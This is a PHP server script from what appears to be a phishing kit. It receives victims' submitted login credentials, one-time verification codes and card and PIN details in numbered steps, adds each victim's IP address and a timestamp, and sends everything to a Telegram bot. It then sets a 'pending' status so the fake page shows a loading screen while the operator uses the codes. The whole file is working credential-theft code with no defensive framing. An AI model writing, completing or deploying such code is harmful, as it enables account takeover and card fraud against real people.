<?php
require_once __DIR__ . '/config.php';

// Only accept POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    jsonOut(['success' => false, 'message' => 'Invalid request method.']);
}

// Read JSON body
$raw  = file_get_contents('php://input');
$body = json_decode($raw, true);

if (!is_array($body) || !isset($body['step'], $body['data'])) {
    jsonOut(['success' => false, 'message' => 'Malformed payload.']);
}

$step = (int) $body['step'];
$data = $body['data'];

if (!is_array($data) || empty($data)) {
    jsonOut(['success' => false, 'message' => 'No data received.']);
}

// ---------------------------------------------
// Optional: sanitize output text
// ---------------------------------------------
$stepTitles = [
    1 => '🔐 Login Credentials',
    2 => '🔑 OTP / Verification Code',
    3 => '💳 Card / Pin Details',
];

$title = $stepTitles[$step] ?? "📄 Step {$step}";

$text  = "📬 <b>New Submission — {$title}</b>\n";
$text .= "────────────────────\n";

foreach ($data as $key => $value) {
    $text .= "• <b>" . h($key) . ":</b> " . h($value) . "\n";
}

$text .= "────────────────────\n";
$text .= "🌐 IP: " . h($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n";
$text .= "🕒 " . date('Y-m-d H:i:s');

// ---------------------------------------------
// Send to Telegram
// ---------------------------------------------
$ok = sendTelegram($text);

if (!$ok) {
    jsonOut(['success' => false, 'message' => 'Failed to send to Telegram.']);
}

// ---------------------------------------------
// Update state: set status to pending so frontend shows loading
// ---------------------------------------------
$state = loadState();
$state['step']   = $step;
$state['status'] = 'pending';
saveState($state);

jsonOut(['success' => true, 'message' => 'Submitted.']);